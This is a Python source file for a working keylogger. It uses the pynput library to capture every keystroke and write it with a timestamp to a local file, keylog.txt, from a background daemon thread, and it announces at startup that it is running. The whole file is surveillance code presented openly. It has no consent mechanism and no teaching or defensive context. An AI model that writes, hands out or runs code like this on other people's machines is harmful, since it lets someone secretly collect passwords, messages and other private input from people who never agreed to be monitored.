import pynput
import threading
import logging
from pynput import keyboard

# Setup logging to save keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def process_key_strike(key):
    """Function to process key presses and log them."""
    try:
        logging.info(f"{key.char}")  # Log regular key presses
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.enter:
            logging.info("\n")
        else:
            logging.info(f" {str(key)} ")

# Define and start the keylogger listener
def start_keylogger():
    with keyboard.Listener(on_press=process_key_strike) as listener:
        listener.join()

# Run keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

print("Keylogger is running... Press CTRL + C to stop.")
keylogger_thread.join()
